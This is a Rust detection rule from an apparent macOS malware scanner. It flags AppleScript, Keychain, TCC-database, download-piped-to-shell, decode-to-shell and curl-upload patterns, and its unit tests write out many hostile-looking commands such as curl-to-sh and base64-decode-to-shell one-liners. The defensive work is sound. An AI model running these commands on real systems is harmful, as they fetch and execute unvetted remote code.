//! Suspicious string/import scanning (§5.2): `dlopen`, `NSAppleScript`/
//! `osascript`, TCC database paths, Keychain APIs, curl-pipe-to-shell. A cheap
//! cross-platform substring scan, streamed past the 8 MiB prefix through the
//! scan's own file handle when truncation and file size allow it.

use super::{Rule, RuleOutcome};
use crate::context::{ScanContext, MAX_STREAM_BYTES};
use crate::model::{MatchedSignal, SignalCategory};
use crate::textclass::{classify_text, TextClass};

/// Score per matched name marker in a script/text file.
const NAME_WEIGHT: i32 = 2;

/// Cap on the combined name-marker score: names corroborate, and cannot reach
/// Notify alone (§5.2).
const NAME_FLOOR_CAP: i32 = 5;

/// A bare name that only corroborates intent patterns.
struct Marker {
    needle: &'static str,
    note: &'static str,
    /// Require a non-word byte (or end of input) after the needle — see
    /// `contains_token`. Used for markers that would otherwise match as a
    /// prefix of an unrelated word (`| sh` inside `| shasum`).
    bounded: bool,
}

const MARKERS: &[Marker] = &[
    Marker {
        needle: "NSAppleScript",
        note: "references NSAppleScript (AppleScript execution API)",
        bounded: false,
    },
    Marker {
        needle: "osascript",
        note: "references osascript (AppleScript/JXA interpreter)",
        bounded: false,
    },
    Marker {
        needle: "dlopen",
        note: "references dlopen (dynamic library loading)",
        bounded: false,
    },
    Marker {
        needle: "SecKeychain",
        note: "references Keychain Services APIs",
        bounded: false,
    },
    Marker {
        needle: "curl ",
        note: "references curl invocation",
        bounded: false,
    },
    Marker {
        needle: "| sh",
        note: "curl/download-pipe-to-shell pattern",
        bounded: true,
    },
    Marker {
        needle: "| bash",
        note: "curl/download-pipe-to-shell pattern",
        bounded: true,
    },
];

/// Whether `needle` occurs in `haystack` as a token, not as a prefix of a
/// longer word (`| sh` in `| shasum`). A match counts when the byte after it
/// is not ASCII alphanumeric/`_`/`-`/`.` — a negative class, since content is
/// lossy-decoded binary too (bplist/Mach-O bytes). A match running off the
/// end of `haystack` counts only when `is_last`: when scanning one window of
/// a larger stream, that match's tail is still ahead in the next window's
/// overlap and gets judged again once the following byte is available.
fn contains_token(haystack: &str, needle: &str, is_last: bool) -> bool {
    haystack.match_indices(needle).any(|(start, _)| {
        match haystack.as_bytes().get(start + needle.len()) {
            None => is_last,
            Some(&b) => !is_word(b),
        }
    })
}

/// Longest `MARKERS` needle, in bytes.
const fn max_marker_len() -> usize {
    let mut max = 0usize;
    let mut i = 0usize;
    while i < MARKERS.len() {
        let len = MARKERS[i].needle.len();
        if len > max {
            max = len;
        }
        i += 1;
    }
    max
}

const MAX_MARKER_LEN: usize = max_marker_len();

/// A pattern must complete within this many bytes, first token to last.
const PATTERN_SPAN: usize = 4096;

/// Extra bytes of left context a streamed window keeps so a pattern's
/// command-position check never sees a window edge.
const CONTEXT_LOOKBACK: usize = 64;

/// Streaming overlap: any marker or pattern lands whole, with its left
/// context, in some window.
const STREAM_OVERLAP: usize = if MAX_MARKER_LEN > PATTERN_SPAN + CONTEXT_LOOKBACK {
    MAX_MARKER_LEN
} else {
    PATTERN_SPAN + CONTEXT_LOOKBACK
};

/// A multi-token intent (§5.2) that scores independently of the name markers.
struct IntentPattern {
    weight: i32,
    note: &'static str,
}

const DOWNLOAD_TO_SHELL: usize = 0;
const DECODE_TO_SHELL: usize = 1;
const OSASCRIPT_DOWNLOAD: usize = 2;
const TCC_DATABASE: usize = 3;
const LOCAL_UPLOAD: usize = 4;

const PATTERNS: &[IntentPattern] = &[
    IntentPattern {
        weight: 15,
        note: "download piped to a shell",
    },
    IntentPattern {
        weight: 15,
        note: "decoded payload piped to a shell",
    },
    IntentPattern {
        weight: 15,
        note: "osascript runs a download",
    },
    IntentPattern {
        weight: 10,
        note: "references the TCC permissions database directly",
    },
    IntentPattern {
        weight: 10,
        note: "curl uploads a local file",
    },
];

/// Which markers and patterns have matched so far.
struct Hits {
    markers: Vec<bool>,
    patterns: [bool; PATTERNS.len()],
}

impl Hits {
    fn new() -> Self {
        Hits {
            markers: vec![false; MARKERS.len()],
            patterns: [false; PATTERNS.len()],
        }
    }
}

fn is_word(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.')
}

fn is_blank(b: u8) -> bool {
    matches!(b, b' ' | b'\t')
}

fn skip_blanks(line: &[u8], mut i: usize) -> usize {
    while i < line.len() && is_blank(line[i]) {
        i += 1;
    }
    i
}

/// Whether the words after byte `from` are exactly `words`, blank-separated.
fn words_follow(line: &[u8], mut from: usize, words: &[&[u8]]) -> bool {
    for w in words {
        let s = skip_blanks(line, from);
        let mut e = s;
        while e < line.len() && is_word(line[e]) {
            e += 1;
        }
        if s == from || &line[s..e] != *w {
            return false;
        }
        from = e;
    }
    true
}

/// Index just past the trailing blanks-trimmed text before `s`.
fn trimmed_before(line: &[u8], s: usize) -> usize {
    let mut j = s;
    while j > 0 && is_blank(line[j - 1]) {
        j -= 1;
    }
    j
}

/// Words after which the next token is a command.
const INTRODUCERS: &[&[u8]] = &[
    b"sudo", b"exec", b"eval", b"then", b"do", b"else", b"nohup", b"time", b"command", b"builtin",
    b"env",
];

/// Longest path or assignment word walked back over, and most assignment
/// words skipped, when judging command position.
const MAX_WALK_BACK: usize = 256;
const MAX_ASSIGNMENTS: usize = 16;

/// Whether a token at `s` is at command position: nothing before it on the
/// line, or a separator or keyword introducer, possibly behind leading
/// `NAME=value` assignments. A token whose left context is cut by a window
/// edge is never at command position.
fn at_command_position(line: &[u8], mut s: usize, cut_start: bool) -> bool {
    for _ in 0..=MAX_ASSIGNMENTS {
        let j = trimmed_before(line, s);
        if j == 0 {
            return !cut_start;
        }
        if matches!(line[j - 1], b';' | b'|' | b'(' | b'&') && is_escaped(line, j - 1) {
            return false;
        }
        match line[j - 1] {
            b';' | b'|' | b'`' | b'(' | b'"' | b'\'' => return true,
            b'&' => return is_background_or_and(line, j - 1),
            b'{' | b'!' if j < s && (j == 1 || is_blank(line[j - 2])) => return true,
            _ => {}
        }
        let mut k = j;
        while k > 0 && is_word(line[k - 1]) {
            k -= 1;
        }
        if k < j && (k > 0 || !cut_start) && INTRODUCERS.contains(&&line[k..j]) {
            return true;
        }
        // A `NAME=value` word: judge the token before it instead.
        let mut t = j;
        while t > 0 && j - t < MAX_WALK_BACK && !is_blank(line[t - 1]) {
            t -= 1;
        }
        let Some(eq) = line[t..j].iter().position(|&b| b == b'=') else {
            return false;
        };
        let name = &line[t..t + eq];
        if name.is_empty()
            || name[0].is_ascii_digit()
            || !name.iter().all(|&b| b.is_ascii_alphanumeric() || b == b'_')
        {
            return false;
        }
        s = t;
    }
    false
}

/// Start of the command a basename word at `s..e` belongs to, if that
/// command is at command position: the word itself, or the start of its
/// path (`/bin/bash`, `~/bin/curl`) or backslash escape (`\curl`).
fn command_start(line: &[u8], s: usize, e: usize, cut_start: bool) -> Option<usize> {
    let mut start = s;
    if s > 0 && line[s - 1] == b'/' {
        if line.get(e) == Some(&b'/') {
            return None;
        }
        while start > 0
            && s - start < MAX_WALK_BACK
            && (is_word(line[start - 1]) || line[start - 1] == b'/')
        {
            start -= 1;
        }
        if start > 0 && line[start - 1] == b'~' {
            start -= 1;
        }
    } else if s > 0 && line[s - 1] == b'\\' {
        start -= 1;
    }
    at_command_position(line, start, cut_start).then_some(start)
}

/// Whether the byte at `i` is escaped by an odd run of backslashes before it.
fn is_escaped(line: &[u8], i: usize) -> bool {
    line[..i].iter().rev().take_while(|&&b| b == b'\\').count() % 2 == 1
}

/// Whether the `|` at `pipe` separates regex alternatives — `(bash|sh|zsh)`:
/// blank-free words chained by `|` back to an opening `(` that is not a
/// `$(`/`<(` substitution. Only walks back `MAX_WALK_BACK` bytes.
fn is_alternation(line: &[u8], pipe: usize) -> bool {
    let floor = pipe.saturating_sub(MAX_WALK_BACK);
    let mut i = pipe;
    loop {
        let end = i;
        while i > floor && is_word(line[i - 1]) {
            i -= 1;
        }
        if i == end || i == 0 {
            return false;
        }
        match line[i - 1] {
            b'|' if i - 1 > floor => i -= 1,
            b'(' => return i < 2 || !matches!(line[i - 2], b'$' | b'<' | b'>'),
            _ => return false,
        }
    }
}

/// Whether the token at `s` sits directly inside `<(` or `$(`.
fn directly_in_substitution(line: &[u8], s: usize) -> bool {
    let j = trimmed_before(line, s);
    (line[..j].ends_with(b"<(") || line[..j].ends_with(b"$("))
        && (j < 2 || !is_escaped(line, j - 2))
}

/// `sudo` options that take a separate argument.
const SUDO_ARG_FLAGS: &[&[u8]] = &[b"-u", b"-g", b"-h", b"-p", b"-C", b"-r", b"-t", b"-U"];

/// `env` options that take a separate argument.
const ENV_ARG_FLAGS: &[&[u8]] = &[b"-u", b"-C", b"-S"];

/// Most wrapper words and options skipped between a pipe and its shell.
const MAX_PIPE_TOKENS: usize = 64;

/// The shell-word token at `i`: an optional opening quote, then a run of
/// bytes up to a blank, separator or quote. Returns the token and the index
/// just past it; `None` when empty.
fn shell_token(line: &[u8], i: usize) -> Option<(&[u8], usize)> {
    let start = i + usize::from(matches!(line.get(i), Some(b'"' | b'\'')));
    let mut end = start;
    while end < line.len()
        && !is_blank(line[end])
        && !matches!(
            line[end],
            b';' | b'|' | b'&' | b'(' | b')' | b'<' | b'>' | b'"' | b'\'' | b'`'
        )
    {
        end += 1;
    }
    (end > start).then(|| (&line[start..end], end))
}

fn basename(token: &[u8]) -> &[u8] {
    token.rsplit(|&b| b == b'/').next().unwrap_or(token)
}

/// If the `|` (or `|&`) at `pipe` feeds a shell (`sh`/`bash`/`zsh` under any
/// directory, optionally quoted, behind `sudo` and its options, `env`,
/// `exec` or `command`), the index just past the shell name. `None` when the
/// name touches a cut line end.
fn pipe_to_shell(line: &[u8], pipe: usize, cut_end: bool) -> Option<usize> {
    if line.get(pipe + 1) == Some(&b'|') || (pipe > 0 && line[pipe - 1] == b'|') {
        return None;
    }
    let after = pipe + 1 + usize::from(line.get(pipe + 1) == Some(&b'&'));
    let mut i = skip_blanks(line, after);
    for _ in 0..MAX_PIPE_TOKENS {
        let (token, end) = shell_token(line, i)?;
        i = skip_blanks(line, end);
        match basename(token) {
            b"sh" | b"bash" | b"zsh" if !token.ends_with(b"/") => {
                return (!(end == line.len() && cut_end)).then_some(end);
            }
            b"exec" | b"command" => {}
            b"sudo" => i = skip_options(line, i, SUDO_ARG_FLAGS, false),
            b"env" => i = skip_options(line, i, ENV_ARG_FLAGS, true),
            _ => return None,
        }
    }
    None
}

/// Skips option words (and their arguments, and `NAME=value` words when
/// `assignments`) starting at `i`; returns the index of the next word.
fn skip_options(line: &[u8], mut i: usize, arg_flags: &[&[u8]], assignments: bool) -> usize {
    for _ in 0..MAX_PIPE_TOKENS {
        let Some((token, end)) = shell_token(line, i) else {
            break;
        };
        if token.starts_with(b"-") {
            i = skip_blanks(line, end);
            if arg_flags.contains(&token) {
                i = shell_token(line, i).map_or(i, |(_, e)| skip_blanks(line, e));
            }
        } else if assignments && token.contains(&b'=') {
            i = skip_blanks(line, end);
        } else {
            break;
        }
    }
    i
}

/// A decoder invocation waiting for its flags.
#[derive(Clone, Copy)]
struct Decoder {
    start: usize,
    subcommand: bool,
    flag: bool,
}

impl Decoder {
    fn ready(&self) -> bool {
        self.subcommand && self.flag
    }
}

/// Per-line matcher state; every `Option<usize>` is the start of the most
/// recent qualifying token, the best candidate for the span check.
#[derive(Default)]
struct LineState {
    downloader: Option<usize>,
    shellish: Option<usize>,
    curl: Option<usize>,
    /// `base64`, `openssl`, `xxd`.
    decoders: [Option<Decoder>; 3],
    osascript: Option<usize>,
    osascript_runs_shell: bool,
}

fn within_span(start: usize, end: usize) -> bool {
    end - start <= PATTERN_SPAN
}

/// Longest `-F` argument examined for `=@`.
const MAX_FORM_ARG: usize = 256;

/// Whether `-d`/`--data*`/`-F`/`-T`/`--upload-file` at `end` names a local
/// file. The `-F` argument scan stops at `curl_start + PATTERN_SPAN` and at
/// `MAX_FORM_ARG` bytes, so a run of `-F` flags stays linear.
fn upload_flag(line: &[u8], word: &[u8], end: usize, curl_start: usize) -> bool {
    match word {
        b"--data-binary" | b"--data" | b"-d" => line.get(skip_blanks(line, end)) == Some(&b'@'),
        b"-F" => {
            let s = skip_blanks(line, end);
            let limit = (curl_start + PATTERN_SPAN)
                .min(s + MAX_FORM_ARG)
                .min(line.len());
            line[s..limit]
                .split(|&b| is_blank(b))
                .next()
                .is_some_and(|arg| arg.windows(2).any(|w| w == b"=@"))
        }
        b"-T" => line.get(end).is_some_and(|&b| is_blank(b)) && skip_blanks(line, end) < line.len(),
        b"--upload-file" => true,
        _ => false,
    }
}

/// Whether the `&` at `i` ends a command (`&&`, background `&`) rather than
/// belonging to a redirection (`2>&1`, `&>`) or a `|&` pipe.
fn is_background_or_and(line: &[u8], i: usize) -> bool {
    let prev = i.checked_sub(1).map(|p| line[p]);
    !matches!(prev, Some(b'>' | b'<' | b'|')) && line.get(i + 1) != Some(&b'>')
}

/// Whether the next non-blank byte at or after `from` closes a `{ …; }` or
/// `( … )` group, whose output may still feed a pipe.
fn closes_group(line: &[u8], from: usize) -> bool {
    matches!(line.get(skip_blanks(line, from)), Some(b'}' | b')'))
}

/// Matches the line-scoped patterns in one line, setting `hits`. `cut_start`
/// / `cut_end` mark a line edge that is a window edge, not a real delimiter.
fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATTERNS.len()]) {
    let mut st = LineState::default();
    let (mut single, mut double) = (false, false);
    let mut i = 0;
    while i < line.len() {
        let b = line[i];
        let unquoted = !single && !double;
        match b {
            b'\\' if !single => {
                // An escaped metacharacter (or backslash) is literal; a
                // backslash before a word is the `\curl` form.
                let literal = line
                    .get(i + 1)
                    .is_some_and(|&c| !is_word(c) && !is_blank(c));
                i += if literal { 2 } else { 1 };
                continue;
            }
            b'\'' if !double => {
                single = !single;
                i += 1;
                continue;
            }
            b'"' if !single => {
                double = !double;
                i += 1;
                continue;
            }
            b';' if unquoted && !closes_group(line, i + 1) => st = LineState::default(),
            b'&' if unquoted && is_background_or_and(line, i) && !closes_group(line, i + 1) => {
                st = LineState::default();
            }
            b'|' if unquoted && line.get(i + 1) == Some(&b'|') => st = LineState::default(),
            _ => {}
        }
        if line[i] == b'|' {
            if let Some(end) = pipe_to_shell(line, i, cut_end).filter(|_| !is_alternation(line, i))
            {
                if st.downloader.is_some_and(|d| within_span(d, end)) {
                    hits[DOWNLOAD_TO_SHELL] = true;
                }
                if st
                    .decoders
                    .iter()
                    .flatten()
                    .any(|d| d.ready() && within_span(d.start, end))
                {
                    hits[DECODE_TO_SHELL] = true;
                }
            }
            i += 1;
            continue;
        }
        if !is_word(line[i]) {
            i += 1;
            continue;
        }
        let (s, mut e) = (i, i);
        while e < line.len() && is_word(line[e]) {
            e += 1;
        }
        i = e;
        if (s == 0 && cut_start) || (e == line.len() && cut_end) {
            continue;
        }
        let word = &line[s..e];
        let head = if matches!(
            word,
            b"curl"
                | b"wget"
                | b"sh"
                | b"bash"
                | b"zsh"
                | b"eval"
                | b"base64"
                | b"openssl"
                | b"xxd"
                | b"osascript"
        ) {
            command_start(line, s, e, cut_start)
        } else {
            None
        };

        if let Some(cs) = head {
            match word {
                b"curl" | b"wget" => {
                    st.downloader = Some(cs);
                    if word == b"curl" {
                        st.curl = Some(cs);
                    }
                    if directly_in_substitution(line, cs)
                        && st.shellish.is_some_and(|sh| within_span(sh, e))
                    {
                        hits[DOWNLOAD_TO_SHELL] = true;
                    }
                }
                b"sh" | b"bash" | b"zsh" | b"eval" => st.shellish = Some(cs),
                b"base64" => {
                    st.decoders[0] = Some(Decoder {
                        start: cs,
                        subcommand: true,
                        flag: false,
                    });
                }
                b"openssl" => {
                    st.decoders[1] = Some(Decoder {
                        start: cs,
                        subcommand: false,
                        flag: false,
                    });
                }
                b"xxd" => {
                    st.decoders[2] = Some(Decoder {
                        start: cs,
                        subcommand: true,
                        flag: false,
                    });
                }
                _ => {
                    st.osascript = Some(cs);
                    st.osascript_runs_shell = false;
                }
            }
        }

        match word {
            b"-d" | b"-D" | b"--decode" => {
                if let Some(d) = &mut st.decoders[0] {
                    d.flag = true;
                }
                if word == b"-d" {
                    if let Some(d) = &mut st.decoders[1] {
                        d.flag = true;
                    }
                }
            }
            b"-r" => {
                if let Some(d) = &mut st.decoders[2] {
                    d.flag = true;
                }
            }
            b"enc" | b"base64" => {
                if let Some(d) = &mut st.decoders[1] {
                    d.subcommand = true;
                }
            }
            b"do" if words_follow(line, e, &[b"shell", b"script"]) => {
                // AppleScript source needs no `osascript` token.
                st.osascript.get_or_insert(s);
                st.osascript_runs_shell = true;
            }
            b"curl" | b"wget" => {
                if let Some(o) = st.osascript {
                    if st.osascript_runs_shell && within_span(o, e) {
                        hits[OSASCRIPT_DOWNLOAD] = true;
                    }
                }
            }
            _ => {}
        }
        if let Some(c) = st.curl {
            if within_span(c, e) && upload_flag(line, word, e, c) {
                hits[LOCAL_UPLOAD] = true;
            }
        }
    }
}

/// Runs [`scan_line`] over each `\n`/`\r`/NUL-delimited line of `text`; a
/// backslash before `\n` or `\r\n` joins the next line (as one blank).
/// `is_first`/`is_last` say whether the window's edges are real input edges.
fn scan_patterns(text: &str, is_first: bool, is_last: bool, hits: &mut [bool; PATTERNS.len()]) {
    if !hits[TCC_DATABASE] && text.contains("TCC.db") {
        hits[TCC_DATABASE] = true;
    }
    let bytes = text.as_bytes();
    let mut joined: Vec<u8> = Vec::new();
    let mut line_start = 0;
    let mut start = 0;
    while start <= bytes.len() && !hits.iter().all(|&h| h) {
        let end = bytes[start..]
            .iter()
            .position(|&b| matches!(b, b'\n' | b'\r' | 0))
            .map_or(bytes.len(), |p| start + p);
        let newline_len = match (bytes.get(end), bytes.get(end + 1)) {
            (Some(b'\n'), _) => 1,
            (Some(b'\r'), Some(b'\n')) => 2,
            _ => 0,
        };
        if newline_len > 0 && end > start && bytes[end - 1] == b'\\' {
            joined.extend_from_slice(&bytes[start..end - 1]);
            joined.push(b' ');
            start = end + newline_len;
            continue;
        }
        let line = if joined.is_empty() {
            &bytes[start..end]
        } else {
            joined.extend_from_slice(&bytes[start..end]);
            &joined[..]
        };
        if !line.is_empty() {
            scan_line(
                line,
                line_start == 0 && !is_first,
                end == bytes.len() && !is_last,
                hits,
            );
        }
        joined.clear();
        start = end + 1;
        line_start = start;
    }
}

/// Scans one window's lossy-decoded text for `MARKERS` and the intent
/// patterns, setting `hits`. `is_first`/`is_last` are forwarded to
/// [`scan_patterns`]; `is_last` also to [`contains_token`].
fn scan_window(text: &str, is_first: bool, is_last: bool, hits: &mut Hits) {
    for (i, marker) in MARKERS.iter().enumerate() {
        if hits.markers[i] {
            continue;
        }
        let matched = if marker.bounded {
            contains_token(text, marker.needle, is_last)
        } else {
            text.contains(marker.needle)
        };
        if matched {
            hits.markers[i] = true;
        }
    }
    scan_patterns(text, is_first, is_last, &mut hits.patterns);
}

/// Total weight and notes (patterns first, then counted names) for `hits`.
/// Names count only when the resident content reads as script/text.
fn score(hits: &Hits, ctx: &ScanContext) -> (i32, Vec<&'static str>) {
    let mut weight = 0;
    let mut notes: Vec<&'static str> = Vec::new();
    for (p, _) in PATTERNS
        .iter()
        .zip(hits.patterns.iter())
        .filter(|(_, &hit)| hit)
    {
        weight += p.weight;
        notes.push(p.note);
    }
    // Binaries name APIs legitimately; only script/text counts names.
    let names_count = hits.markers.iter().any(|&h| h)
        && ctx.content.as_deref().is_some_and(|content| {
            matches!(classify_text(content, &ctx.path), TextClass::Text { .. })
        });
    if names_count {
        let names: Vec<&'static str> = MARKERS
            .iter()
            .zip(hits.markers.iter())
            .filter(|(_, &hit)| hit)
            .map(|(m, _)| m.note)
            .collect();
        weight += (names.len() as i32 * NAME_WEIGHT).min(NAME_FLOOR_CAP);
        notes.extend(names);
    }
    (weight, notes)
}

pub struct SuspiciousStringsRule;

impl Default for SuspiciousStringsRule {
    fn default() -> Self {
        SuspiciousStringsRule
    }
}

impl Rule for SuspiciousStringsRule {
    fn id(&self) -> &'static str {
        "suspicious-strings"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::StaticSuspicion
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let mut hits = Hits::new();

        if ctx.truncated && can_stream(ctx) {
            let file_len = ctx.file_len.ok_or(RuleOutcome::NotApplicable)?;
            let mut first = true;
            let ok = ctx.for_each_window(0..file_len, STREAM_OVERLAP, |window, is_last| {
                // Lossy-decoded: ASCII markers still match, no panic on non-UTF-8.
                scan_window(&String::from_utf8_lossy(window), first, is_last, &mut hits);
                first = false;
            });
            if !ok {
                ctx.mark_stream_failed(self.id());
            }
            // A stream that failed partway still reported real hits from
            // before the failure — keep those rather than discard them; a
            // failure with nothing that scores is NotApplicable, not clean
            // (a name in a binary scores 0 but could have hidden a pattern).
            if !ok && score(&hits, ctx).0 == 0 {
                return Err(RuleOutcome::NotApplicable);
            }
        } else {
            let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;
            // `ctx.truncated` means `content` stops short of the real end of
            // input (an embedded/container budget, a file past the stream
            // cap, or no ranged-read support) — a bounded marker ending
            // exactly at that cut is inconclusive, not a real end-of-input
            // match (§10/§11.8).
            scan_window(
                &String::from_utf8_lossy(content),
                true,
                !ctx.truncated,
                &mut hits,
            );
        }

        let (weight, notes) = score(&hits, ctx);
        if weight == 0 {
            return Ok(None);
        }

        let description = format!("matched {} indicator(s): {}", notes.len(), notes.join("; "));

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight,
            description,
            category: self.category(),
        }))
    }

    /// Streams the whole file through the scan's own handle (§11.7) when it's
    /// within the streaming cap and the stream didn't fail partway —
    /// otherwise unread bytes past the 8 MiB prefix may hide a marker.
    fn covers_truncation(&self, ctx: &ScanContext) -> bool {
        can_stream(ctx) && !ctx.stream_failed(self.id())
    }
}

/// Whether `evaluate` can stream `ctx` past the prefix at all: ranged reads
/// are actually possible, and the file is within the streaming cap.
/// Separate from `covers_truncation`, which also requires that a stream
/// actually attempted didn't fail.
fn can_stream(ctx: &ScanContext) -> bool {
    ctx.supports_ranged_reads() && ctx.file_len.is_some_and(|len| len <= MAX_STREAM_BYTES)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::{MAX_CONTENT_BYTES, STREAM_CHUNK};
    use crate::test_support::{sparse_temp_file, write_at};

    #[test]
    fn rejects_word_extensions() {
        assert!(!contains_token("cat f | shasum -a 256", "| sh", true));
        assert!(!contains_token("cat f | sha256sum", "| sh", true));
        assert!(!contains_token("shuf -n1 list.txt | shuf", "| sh", true));
        assert!(!contains_token(
            "eval \"$(bashcompinit)\" | bashcompinit",
            "| bash",
            true
        ));
    }

    #[test]
    fn accepts_token_boundaries() {
        assert!(contains_token("curl x | sh", "| sh", true));
        assert!(contains_token("curl x | sh -s", "| sh", true));
        assert!(contains_token("curl x | sh\n", "| sh", true));
        assert!(contains_token("curl x | sh;", "| sh", true));
        assert!(contains_token("curl x | sh)", "| sh", true));
        assert!(contains_token("curl x | sh\"", "| sh", true));
        assert!(contains_token("curl x | sh\0", "| sh", true));
        assert!(contains_token("curl x | sh\t", "| sh", true));
        assert!(contains_token("curl x | bash", "| bash", true));
    }

    /// A match running off the end of a non-final window is inconclusive —
    /// the following byte lives in the next window's overlap — so it isn't
    /// counted until `is_last` says there's truly nothing more.
    #[test]
    fn a_match_at_the_end_of_a_non_final_window_is_not_counted() {
        assert!(!contains_token("curl x | sh", "| sh", false));
    }

    fn fired(text: &str) -> [bool; PATTERNS.len()] {
        let mut hits = [false; PATTERNS.len()];
        scan_patterns(text, true, true, &mut hits);
        hits
    }

    fn fires(text: &str, pattern: usize) -> bool {
        fired(text)[pattern]
    }

    fn none_fire(text: &str) -> bool {
        fired(text) == [false; PATTERNS.len()]
    }

    #[test]
    fn download_to_shell_fires_on_canonical_forms() {
        for t in [
            "curl -fsSL https://x.test/i | sh",
            "wget -qO- x | sudo bash",
            "wget -qO- x | /usr/bin/env zsh -s",
            "curl x | /bin/sh",
            "bash <(curl -s x)",
            "sh -c \"$(curl -fsSL x)\"",
            "eval \"$(curl -fsSL x)\"",
            "exec(\"curl -s x | sh\")",
            "cd /tmp && curl x | bash",
            "echo hi; sudo curl x | bash -s",
        ] {
            assert!(fires(t, DOWNLOAD_TO_SHELL), "{t}");
        }
    }

    #[test]
    fn download_to_shell_rejects_non_intent() {
        for t in [
            ": curl x | sh",
            "$ curl x | sh",
            "<code>curl x | sh",
            "see libcurl x | sh",
            "libcurl | sh",
            "curlx x | sh",
            "curl x | shasum",
            "curl x > f; sh f",
            "curl x || sh",
            "curl x | sh.exe",
            "curl x & sh",
            "echo <(curl x)",
            "curl x\n| sh",
            "curl x\nsh -c foo | sh",
        ] {
            assert!(none_fire(t), "{t}");
        }
    }

    #[test]
    fn state_is_scoped_to_one_command() {
        for t in [
            "eval \"$(brew shellenv)\"; LATEST=$(curl -fsSL https://api.github.com/x)",
            "osascript -e 'do shell script \"launchctl kickstart x\"' && curl -fsSLO https://v/u.zip",
            "curl -LO url && ssh -T git@host",
            "base64 f > o; tr -d x < y | sh",
            "curl -s x 2>&1 > f; sh f | sh",
        ] {
            assert!(none_fire(t), "{t}");
        }
    }

    #[test]
    fn pipes_and_quoted_separators_do_not_reset_state() {
        assert!(fires("curl x 2>&1 | sh", DOWNLOAD_TO_SHELL));
        assert!(fires("curl x | tee f | sh", DOWNLOAD_TO_SHELL));
        assert!(fires("echo x | base64 -d | gunzip | sh", DECODE_TO_SHELL));
        assert!(fires(
            "osascript -e 'do shell script \"curl x && sh y\"'",
            OSASCRIPT_DOWNLOAD
        ));
        assert!(fires("sh -c \"$(curl -fsSL x)\"", DOWNLOAD_TO_SHELL));
        assert!(fires("bash <(curl -fsSL x)", DOWNLOAD_TO_SHELL));
        assert!(fires(
            "sudo sh -c \"$(curl -fsSL x)\"; true",
            DOWNLOAD_TO_SHELL
        ));
    }

    #[test]
    fn commands_are_recognised_by_path_keyword_and_prefix() {
        for t in [
            "/bin/bash -c \"$(curl -fsSL https://x.test/i)\"",
            "sudo /bin/bash -c \"$(curl -fsSL x)\"",
            "/opt/homebrew/bin/bash -c \"$(curl -fsSL x)\"",
            "eval \"$(/usr/bin/curl -fsSL x)\"",
            "/usr/bin/curl x | sh",
            "~/bin/curl x | sh",
            "if true; then curl x | sh; fi",
            "x=1 curl x | sh",
            "A=1 B=2 curl x | sh",
            "nohup curl x | bash",
            "time command curl x | sh",
            "{ curl x; } | sh",
            "( curl x ) | sh",
            "\\curl x | sh",
            "sleep 1 & curl x | sh",
        ] {
            assert!(fires(t, DOWNLOAD_TO_SHELL), "{t}");
        }
        assert!(fires("echo P | /usr/bin/base64 -d | sh", DECODE_TO_SHELL));
        assert!(fires(
            "/usr/bin/osascript -e 'do shell script \"curl x\"'",
            OSASCRIPT_DOWNLOAD
        ));
    }

    #[test]
    fn paths_and_keywords_in_prose_are_not_commands() {
        for t in [
            "see http://x/curl x | sh",
            "at foo.com/curl x | sh",
            "/usr/bin/curl/x | sh",
            "echo curl x | sh",
            "1=2 curl x | sh",
            "Note! curl x | sh",
            "${curl} x | sh",
        ] {
            assert!(!fires(t, DOWNLOAD_TO_SHELL), "{t}");
        }
    }

    #[test]
    fn long_path_and_assignment_runs_stay_linear() {
        for unit in ["/curl", "a=1 ", "\\curl "] {
            let line = unit.repeat(300_000);
            let start = std::time::Instant::now();
            assert!(none_fire(&line));
            assert!(
                start.elapsed() < std::time::Duration::from_secs(5),
                "{unit}"
            );
        }
    }

    #[test]
    fn common_pipe_targets_are_shells() {
        for t in [
            "curl x | sudo -E bash -",
            "curl x | sudo -u root -H sh",
            "curl x | /opt/homebrew/bin/bash",
            "curl x | env sh",
            "curl x | env -i FOO=1 bash",
            "curl x | exec bash",
            "curl x | command sh",
            "curl x | \"sh\"",
            "curl x | 'bash' -s",
            "curl x |& sh",
            "curl x | /usr/bin/env zsh",
            "curl x | sudo /bin/sh",
        ] {
            assert!(fires(t, DOWNLOAD_TO_SHELL), "{t}");
        }
        for t in [
            "curl x | sudo -u root tee f",
            "curl x | env FOO=1",
            "curl x | sudo",
            "curl x | dash",
            "curl x | /bin/sh/",
            "curl x | \"shasum\"",
        ] {
            assert!(!fires(t, DOWNLOAD_TO_SHELL), "{t}");
        }
    }

    #[test]
    fn backslash_newline_joins_lines() {
        for t in [
            "curl -fsSL URL \\\n  | bash",
            "curl -fsSL URL \\\r\n  | bash",
            "curl -fsSL \\\n URL \\\n | sudo \\\n bash",
            "echo x | base64 -d \\\n | sh",
        ] {
            assert!(!none_fire(t), "{t:?}");
        }
        assert!(none_fire("curl x\n| sh"));
    }

    #[test]
    fn continuations_stay_linear_and_safe_at_edges() {
        let line = "curl \\\n".repeat(300_000);
        let start = std::time::Instant::now();
        assert!(none_fire(&line));
        assert!(start.elapsed() < std::time::Duration::from_secs(5));
        let mut hits = [false; PATTERNS.len()];
        scan_patterns("x\\", true, false, &mut hits);
        scan_patterns("\\\r", false, true, &mut hits);
        scan_patterns("\\\n", false, true, &mut hits);
    }

    #[test]
    fn backslash_escaped_metacharacters_are_literal() {
        for t in [
            r"/^curl -s\b.+?\| (bash|sh|zsh)\b|^\/bin\/(bash|sh|zsh) -c\b.+?\bcurl/",
            r"bash <<<|curl -kfsSL) \$\(echo .+? base64 -d\b",
            r"curl x \| sh",
            r"echo \$(curl x)",
            r"curl x \; sh",
            r"echo \(curl x | sh",
        ] {
            assert!(!fires(t, DOWNLOAD_TO_SHELL), "{t}");
        }
        assert!(none_fire(r"echo x \| base64 -d \| sh"));
        assert!(fires("curl x | sh", DOWNLOAD_TO_SHELL));
        assert!(fires("bash -c \"$(curl x)\"", DOWNLOAD_TO_SHELL));
        assert!(fires("echo P | base64 -d | sh", DECODE_TO_SHELL));
